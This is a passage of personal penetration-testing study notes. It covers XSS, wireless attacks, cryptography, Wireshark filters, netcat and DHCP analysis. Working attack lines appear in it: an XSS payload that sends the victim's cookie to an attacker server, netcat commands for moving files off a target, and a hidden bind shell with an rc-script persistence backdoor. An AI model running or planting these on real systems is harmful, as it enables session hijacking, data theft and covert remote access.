   1. After steal a cookie I prepare http request that executes the JavaScript payload, which makes a new request to 192.168.149.128, along with the cookie value in the URL. If I listen for an incoming connection on the attacker-controlled server (192.168.149.128), I can see an incoming request with cookie values appended in the URL. The same information can be found in the access.log file on the server.

        ```bash
        http://www.example.com/?name=test<script>new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>
        ```

   1. With the above cookie information, if I access any internal page of the application and append the cookie value in the request, I can access the page on behalf of the victim, in its own session. Without knowing the username and password!

1. SQL injection <https://portswigger.net/web-security/sql-injection/cheat-sheet>

========================================================================================================

## Wireless Hacking

1. To accomplish this is to use a tool that creates the crypto key based on the password
(which, I don not have). I must capture the authentication handshake used in WPA2 and attempt to crack the pair master key (PMK) from inside (tool such as Aircrack can help with this). TO_DO
1. Usue wireshark and aircrack-ng for capture and injection TO_DO

1. Simpler solutions
   1. Rogue access point
   1. evil twin. SSID on the rogue box is set similar to the legitimate one
   1. denial-of-service. Use any number of tools to craft and send de-authenticate (disassociate) packets to clients of an AP, which will force them to drop their connections (wireless jamers).

=========================================================================================================

## Cryptography and Encryption

1. Symmetric algorithms. Algorithms for cryptography that use the same cryptographic keys for both encryption of plaintext and decryption of ciphertext.
   1. DES = A block cipher that uses a 56-bit key (with 8 bits reserved for parity). Because of the small key size, this encryption standard became quickly outdated and is not considered a very secure encryption algorithm.
   1. 3DES = A block cipher that uses a 168-bit key. 3DES (called triple DES) can use up to three keys in a multiple-encryption method. It’s much more effective than DES but is much slower.
   1. AES = Advanced Encryption Standard. A block cipher that uses a key length of 128, 192, or 256 bits, and effectively replaces DES. It’s much faster than DES or 3DES.
   1. IDEA = International Data Encryption Algorithm. A block cipher that uses a 128-bit key and was also designed to replace DES. Originally used in Pretty Good Privacy (PGP) 2.0, IDEA was patented and used mainly in Europe.
   1. Twofish = A block cipher that uses a key size up to 256 bits.
   1. Blowfish = A fast block cipher, largely replaced by AES, using a 64-bit block size and a key from 32 to 448 bits. Blowfish is considered public domain.
   1. RC = Rivest Cipher. Encompasses several versions, from RC2 through RC6. A block cipher that uses a variable key length up to 2040 bits. RC6, the latest version, uses 128-bit blocks and 4-bit working registers, whereas RC5 uses variable block sizes (32, 64, or 128) and 2-bit working registers.

1. Asymmetric algorithms. Is a cryptographic system that uses pairs of keys: public keys which may be disseminated widely and private keys which are known only to the owner.
   1. Diffie-Hellman = Developed for use as a key exchange protocol, Diffie-Hellman is used in Secure Sockets Layer(SSL) and IPSec encryption. It can be vulnerable to man-in-the-middle attacks.
   1. ECC = Elliptic Curve Cryptosystem. This uses points on an elliptical curve, in conjunction with logarithmic problems, for encryption and signatures. It uses less processing power than other methods, making it a good choice for mobile devices.
   1. RSA = This is an algorithm that achieves strong encryption through the use of two large prime numbers. Factoring these numbers creates key sizes up to 4096 bits. RSA can be used for encryption and digital signatures and is the modern de facto standard.

1. Hash Algorithms. They don’t encrypt anything at all. A hashing algorithm is a one-way mathematical function that takes an input and typically produces a fixed-length string (usually a number), or hash, based on the arrangement of the data bits in the input. Its sole purpose in life is to provide a means to verify the integrity of a piece of data. Change a single bit in the arrangement of the original data, and you’ll get a different response.

   1. MD5 = Message Digest algorithm. This produces a 128-bit hash value output, expressed as a 32-digit hexadecimal number. Serious flaws in the algorithm and the advancement of other hashes have resulted in this hash being rendered obsolete (U.S. CERT, August 2010). Despite its past, MD5 is still used for file verification on downloads and, in many cases, to store passwords.
   1. SHA-1 = Developed by the NSA, SHA-1 produces a 160-bit value output and was required by law for use in U.S. government applications. In late 2005, however, serious flaws became apparent, and the U.S. government began recommending the replacement of SHA-1 with SHA-2 after the year 2010 (see FIPS PUB 180-1).
   1. SHA-2 = This hash algorithm actually holds four separate hash functions that produce outputs of 224, 256, 384, and 512 bits.
   1. SHA-3 = This hash algorithm uses something called “sponge construction,” where data is “absorbed” into the sponge (by XOR-ing the initial bits of the state) and then “squeezed” out (output blocks are read and alternated with state transformations).

1. Digital Certificates. Digital certificate isn’t really involved with encryption at all. It is, instead, a measure by which entities on a network can provide identification. A digital certificate is an electronic file that is used to verify a user’s identity, providing nonrepudiation throughout the system.
   1. The contents of a digital certificate: Version, Serial Number, Subject, Algorithm ID, Issuer, Valid From and Valid To, Key Usage, Subject’s Public Key, Optional fields (Issuer Unique Identifier, Subject Alternative Name and Extensions).

   1. Self-signed certificate. Created internally.

   1. Signed certificates. Indicate a CA is involved and the signature validating the identity of the entity is confirmed via an external source—in some instances, a validation authority (VA). Signed certificates, as opposed to self-signed certificates, can be trusted: assuming the CA chain is validated and not corrupted.

1. Encrypted Communication. Anwsers the question how to transport data securely and safely
   1. Secure Shell (SSH)
   1. Secure Sockets Layer (SSL). This encrypts data at the transport layer, and above, for secure communication across the Internet. It uses RSA encryption and digital certificates and can be used with a wide variety of upper-layer protocols. SSL uses a six-step process for securing a channel. It is being largely replaced by Transport Layer Security (TLS).
   1. Transport Layer Security (TLS). Using an RSA algorithm of 1024 and 2048 bits, TLS is the successor to SSL. The handshake portion (TLS Handshake Protocol) allows both the client and the server to authenticate to each other, and TLS Record Protocol provides the secured communication channel.
   1. Internet Protocol Security (IPSec). This is a network layer tunneling protocol that can be used in two modes: tunnel (entire IP packet encrypted) and transport (data payload encrypted). IPSec is capable of carrying nearly any application. The Authentication Header (AH) protocol verifies an IP packet’s integrity and determines the validity of its source: it provides authentication and integrity, but not confidentiality. Encapsulating Security Payload (ESP) encrypts each packet (in transport mode, the data is encrypted but the headers are not encrypted; in tunnel mode, the entire packet, including the headers, is encrypted).
   1. PGP. Pretty Good Privacy was created way back in 1991 and is used for signing, compression, and encrypting and decrypting e-mails, files, directories, and even whole disk partitions, mainly in an effort to increase the security of e-mail communications. PGP follows the OpenPGP standard (RFC 4880) for encrypting and decrypting data. PGP is known as a hybrid cryptosystem, because it uses features of conventional and public key cryptography.

=========================================================================================================

## WIRESHARK

1. Graph is very useful for analysis.
1. On page <https://hackertarget.com/wireshark-tutorial-and-cheat-sheet/> are some usfule tips.
1. To visually understand packet loss I can utilize following filters:
   1. Indicates we’ve seen a gap in sequence numbers in the capture. Packet loss can lead to duplicate ACKs, which leads to retransmissions.

        ```bash
        tcp.analysis.lost_segment 
        ```

   1. Displays all retransmissions in the capture. A few retransmissions are OK, excessive retransmissions are bad. This usually shows up as slow application performance and/or packet loss to the user.

        ```bash
        tcp.analysis.retransmission
        ```

   1. TCP retransmissions are just one of the many fields that can be used for graphing in troubleshooting scenarios. I can try some of others filters using the same trace file.
   1. HTTP Response times that took more than 400 ms:

        ```bash
        http.time >= 0.4
        ```

   1. TCP ACK that took longer than 50 ms

        ```bash
        tcp.analysis.rto >= 0.050
        ```

1. Examination of Application Layer Sessions. Once you have several packets showing HTTP, select one and then <br>=> select Analyze => Follow => HTTP Stream from the drop-down menu <br>This will show you an assembled HTTP session. In this new window, you see the HTTP request from the browser and HTTP response from the web server.
1. I can find Display Filter Reference on page: <https://www.wireshark.org/docs/dfref/h/http.html>
1. View Telnet sessions I can simply use a filter _telnet_
1. View SMTP or POP3 traffic I can simplyuse filter _smtp_
 or _pop3_
1. Extract files from PCAP using Export (HTTP or SMB) <br>=> File => Export Objects => HTTP <br>The new Window will show any files that were found. In this new Window I can save the individual files or save them all to a folder.<br>A similar method can be used to extract files from SMB sessions. This is the Microsoft Server Message Block protocol that allows Windows File Sharing.<br>=> File => Export Objects => SMB

## NOTES

### SPARTA

It is a python GUI application which simplifies network infrastructure penetration testing by aiding the penetration tester in the scanning and enumeration phases. This is a great tool that combines many different tools (also Nitko) not only for scanning and enumeration but also for hydra brute-force attack

### PORT TO REMEMBER

|  Set One      | Set Two              |
|---------------|----------------------|
|   21 = FTP    | 110       = POP3   |
|   22 = SSH    | 137 - 139 = NetBIOS|  
|   23 = Telnet | 143 = IMAP         |
|   25 = SMTP | 161 - 162 = SNMP   |
|   53 = DNS    | 389 = LDAP         |
|   67 = DHCP | 443 = HTTPS        |
|   80 = HTTP | 445 = SMB          |

### NETWORK CLASSES IPv4

|CIDR Block | Address Range |   Number of IP Addresses|
|--- | --- | ---|
|10.0.0.0/8 | 10.0.0.0 – 10.255.255.255 | 16,777,216|
|172.16.0.0/12 | 172.16.0.0 – 172.31.255.255| 1,048,576|
|192.168.0.0/16| 192.168.0.0 – 192.168.255.255| 65,536|

|commend | explain|
|---|---|
|sipcalc 172.16.0.0/12|    for checking a network|
|sipcalc 172.16.0.0/12 -s 16|  for devide network on 16 subnets; -s > /12 on that example|

### NETCAT FILE TRANSFER AND REMOTE ADMINISTRATION

1. Connecting to a TCP/UDP Port
1. Transferring Files with Netcat
   1. Create a listener on my machine and pipe the traffic from the input into a file

        ```bash
        nc -lvvp 4444 > file_to_download.txt
        
        -l = listening
        -vv = Show extra verbosity
        -p = port for listening
        ```

   1. Back on the ssh session on the target machine we are going to transfer the file through netcat to the listening port on our local machine

        ```bash
        nc -nvv 192.168.1.141 4444 < file_to_download.txt
        
        -n == do not resolve IP address using DNS
        ```

   1. netcat will not tell once the file has finished transferring. It is a good idea to open another shell and do __ls -ls fileToTransfer.csv.enc__ to check when the file has stopped increasing in size.

1. Transfer a whole directory (including its content) from one host to another
   1. On the sender side run first:

        ```bash
        tar cfvz - folderToPass/ | nc -lp 10000
        ```

   1. Second. On the client side run:

        ```bash
        nc [sender ip] 10000 | tar xfvz -
        ```

   1. No info will be printed. But I can check in Wireshark my connection. When I got [PSH, ACK] then
  I can terminate sending file from sender machine

1. Remote Administration with Netcat (Ubuntu Server 18.04)

   1. I don't know how to automate it yet but i can create a reverse shell on a target machine.
  Unfortunately netcat option __-e__ is discarded but with a Ubuntu Server 18.04 I can do something like this:

   1. Server listning and provide a shell (I can use cron but it is veary obvious)

        ```sh
        #!/bin/sh
        rm -f /tmp/.fdata && mkfifo /tmp/.fdata && cat /tmp/.fdata | /bin/bash -i 2>&1 | nc -l [host] [port] > /tmp/.fdata
        ```

   1. From attacking perspective

        ```bash
        nc [host] [port]
        ```

   1. PS Old way working on linux was simple script run from __rc__ directory:

        ```sh
        #!/bin/sh

        #save in /etc/rc.d/rc.ftpp
        mkdir -p /etc/ftp/.data
        while true ; do
        cd /etc/ftp/.data | nc -l -p 1337 -e /bin/sh
        done
        ```

### DHCP ISSUES

1. __Capture DHCP Traffic__
1. Start a Wireshark capture.
1. Open a command prompt.
1. Type ipconfig /renew and press Enter.
1. Type ipconfig /release and press Enter.
1. Type ipconfig /renew and press Enter.
1. Close the command prompt.
1. Stop the Wireshark capture.

1. __Analyze DHCP Request Traffic__
    1. Observe the traffic captured in the top Wireshark packet list pane. To view only DHCP traffic, type:
        > udp.port == 68 (lower case) in the Filter box and press Enter.
    1. In the top Wireshark packet list pane, select the first DHCP packet, labeled DHCP Request.
    1. Observe the packet details in the middle Wireshark packet details pane. Notice that it is an Ethernet II / Internet Protocol Version 4 / User Datagram Protocol / Bootstrap Protocol frame.
    1. Expand Ethernet II to view Ethernet details.
    1. Observe the Destination and Source fields. The destination should be your DHCP server's MAC address and the source should be your MAC address. To confirm You can use:
        > ipconfig /all <br>and<br> arp -a
    1. Expand Internet Protocol Version 4 to view IP details.
    1. Observe the Source address. Notice that the source address is your IP address.
    1. Observe the Destination address. Notice that the destination address is the IP address of the DHCP server.
    1. Expand User Datagram Protocol to view UDP details.
    1. Observe the Source port. Notice that it is bootpc (68), the BOOTP client port.
    1. Observe the Destination port. Notice that it is bootps (67), the BOOTP server port.
    1. Expand Bootstrap Protocol to view BOOTP details.
    1. Observe the DHCP Message Type. Notice that it is a Request (3).
    1. Observe the Client IP address, Client MAC address, and DHCP option fields. This is the request to the DHCP server.
1. __Analyze DHCP ACK Traffic__
    1. In the top Wireshark packet list pane, select the second DHCP packet, labeled DHCP ACK.
    1. Observe the packet details in the middle Wireshark packet details pane. Notice that it is an Ethernet II / Internet Protocol Version 4 / User Datagram Protocol / Bootstrap Protocol frame.
    1. Expand Ethernet II to view Ethernet details.
    1. Observe the Destination and Source fields. The destination should be your MAC address and the source should be your DHCP server's MAC address.
    1. Expand Internet Protocol Version 4 to view IP details.
    1. Observe the Source address. Notice that the source address is the DHCP server IP address.
    1. Observe the Destination address. Notice that the destination address is your IP address.
    1. Expand User Datagram Protocol to view UDP details.
    1. Observe the Source port. Notice that it is bootps (67), the BOOTP server port.
    1. Observe the Destination port. Notice that it is bootpc (68), the BOOTP client port.
    1. Expand Bootstrap Protocol to view BOOTP details.
    1. Observe the DHCP Message Type. Notice that it is an ACK (5).
    1. Observe the Client IP address and Client MAC address fields. This is the acknowledgement from the DHCP server.
    1. Observe the DHCP options and expand to view the details for IP Address Lease Time, Subnet Mask, Router (Default Gateway), Domain Name Server, and Domain Name, as well as any other options if included.
  
1. __Analyze DHCP Release Traffic__
    1. In the top Wireshark packet list pane, select the third DHCP packet, labeled DHCP Release.
    1. Observe the packet details in the middle Wireshark packet details pane. Notice that it is an Ethernet II / Internet Protocol Version 4 / User Datagram Protocol / Bootstrap Protocol frame.
    1. Expand Ethernet II to view Ethernet details.
    1. Observe the Destination and Source fields. The destination should be your DHCP server's MAC address and the source should be your MAC address. To confirm You can use:<br>=> ipconfig /all <br>and<br>arp -a
    1. Expand Internet Protocol Version 4 to view IP details.
    1. Observe the Source address. Notice that the source address is your IP address.
    1. Observe the Destination address. Notice that the destination address is the IP address of the DHCP server.
    1. Expand User Datagram Protocol to view UDP details.
    1. Observe the Source port. Notice that it is bootpc (67), the BOOTP client port.
    1. Observe the Destination port. Notice that it is bootps (68), the BOOTP server port.
    1. Expand Bootstrap Protocol to view BOOTP details.
    1. Observe the DHCP Message Type. Notice that it is a Release (7).
    1. Observe the Client IP address and Client MAC address fields. This is the address that will be released on the DHCP server.
  
1. __Analyze DHCP Discover Traffic__
   1. In the top Wireshark packet list pane, select the fourth DHCP packet, labeled DHCP Discover.
   1. Observe the packet details in the middle Wireshark packet details pane. Notice that it is an Ethernet II / Internet Protocol Version 4 / User Datagram Protocol / Bootstrap Protocol frame.
   1. Expand Ethernet II to view Ethernet details.
   1. Observe the Destination and Source fields. The destination should be the broadcast address ff:ff:ff:ff:ff:ff and the source should be your MAC address. When the client doesn't have an IP address or server information, it has to broadcast to discover a DHCP server.
   1. Expand Internet Protocol Version 4 to view IP details.
   1. Observe the Source address. Notice that the source address is 0.0.0.0, indicating no current IP address.
   1. Observe the Destination address. Notice that the destination address 255.255.255.255, the broadcast IP address.
   1. Expand User Datagram Protocol to view UDP details.
   1. Observe the Source port. Notice that it is bootpc (68), the BOOTP client port.
   1. Observe the Destination port. Notice that it is bootps (67), the BOOTP server port.
   1. Expand Bootstrap Protocol to view BOOTP details.
   1. Observe the DHCP Message Type. Notice that it is a Discover (1).
   1. Observe the Client IP address, Client MAC address, and DHCP option fields. This is the request to the DHCP server.

1. __Analyze DHCP Offer Traffic__
   1. In the top Wireshark packet list pane, select the fifth DHCP packet, labeled DHCP Offer.
   1. Observe the packet details in the middle Wireshark packet details pane. Notice that it is an Ethernet II / Internet Protocol Version 4 / User Datagram Protocol / Bootstrap Protocol frame.
   1. Expand Ethernet II to view Ethernet details.
   1. Observe the Destination and Source fields. The destination should be your MAC address and the source should be your DHCP server's MAC address.
   1. Expand Internet Protocol Version 4 to view IP details.
   1. Observe the Source address. Notice that the source address is the DHCP server's IP address.
   1. Observe the Destination address. Notice that the destination address is 255.255.255.255 (broadcast) address.
   1. Expand User Datagram Protocol to view UDP details.
   1. Observe the Source port. Notice that it is bootps (67), the BOOTP server port.
   1. Observe the Destination port. Notice that it is bootpc (68), the BOOTP client port.
   1. Expand Bootstrap Protocol to view BOOTP details.
   1. Observe the DHCP Message Type. Notice that it is an Offer (2).
   1. Observe the Client IP address and Client MAC address fields. This is the offer from the DHCP server.
   1. Observe the DHCP options and expand to view the details for IP Address Lease Time, Subnet Mask, Router (Default Gateway), Domain Name Server, and Domain Name, as well as any other options if included.

1. __Analyze DHCP Request Traffic__
    1. In the top Wireshark packet list pane, select the sixth DHCP packet, labeled DHCP Request.
    1. Observe the packet details in the middle Wireshark packet details pane. Notice that it is an Ethernet II / Internet Protocol Version 4 / User Datagram Protocol / Bootstrap Protocol frame.
    1. Expand Ethernet II to view Ethernet details.
    1. Observe the Destination and Source fields. The destination should be the broadcast address ff:ff:ff:ff:ff:ff and the source should be your MAC address. When the client doesn't have an IP address or server information, it has to broadcast to request an address lease.
    1. Expand Internet Protocol Version 4 to view IP details.
    1. Observe the Source address. Notice that the source address is 0.0.0.0, indicating no current IP address.
    1. Observe the Destination address. Notice that the destination address 255.255.255.255, the broadcast IP address.
    1. Expand User Datagram Protocol to view UDP details.
    1. Observe the Source port. Notice that it is bootpc (68), the BOOTP client port.
    1. Observe the Destination port. Notice that it is bootps (67), the BOOTP server port.
    1. Expand Bootstrap Protocol to view BOOTP details.
    1. Observe the DHCP Message Type. Notice that it is a Request (3).
    1. Observe the Client IP address, Client MAC address, and DHCP option fields. This is the request to the DHCP server.

1. __Analyze DHCP ACK Traffic__
    1. In the top Wireshark packet list pane, select the seventh DHCP packet, labeled DHCP ACK.
    1. Observe the packet details in the middle Wireshark packet details pane. Notice that it is an Ethernet II / Internet Protocol Version 4 / User Datagram Protocol / Bootstrap Protocol frame.
    1. Expand Ethernet II to view Ethernet details.
    1. Observe the Destination and Source fields. The destination should be your MAC address and the source should be your DHCP server's MAC address.
    1. Expand Internet Protocol Version 4 to view IP details.
    1. Observe the Source address. Notice that the source address is the DHCP server IP address.
    1. Observe the Destination address. Notice that the destination address is the broadcast address 255.255.255.255.
    1. Expand User Datagram Protocol to view UDP details.
    1. Observe the Source port. Notice that it is bootps (67), the BOOTP server port.
    1. Observe the Destination port. Notice that it is bootpc (68), the BOOTP client port.
    1. Expand Bootstrap Protocol to view BOOTP details.
    1. Observe the DHCP Message Type. Notice that it is an ACK (5).
    1. Observe the Client IP address and Client MAC address fields. This is the acknowledgement from the DHCP server.
    1. Observe the DHCP options and expand to view the details for IP Address Lease Time, Subnet Mask, Router (Default Gateway), Domain Name Server, and Domain Name, as well as any other options if included.
    1. Close Wireshark to complete this activity. Quit without Saving to discard the captured traffic.

### NETWORK AUTHORITIES

Go to below authorities and check IP of a target website (there will be ranges provided, of course, main target operates in their own IP range)

1. American Registry for Internet Numbers (ARIN)
1. Asia-Pacific Network Information Center (APNIC)
1. Réseaux IP Européens NCC (RIPE Network Coordination Centre)
1. Latin America and Caribbean Network Information Center (LACNIC)
1. African Network Information Center (AfriNIC)
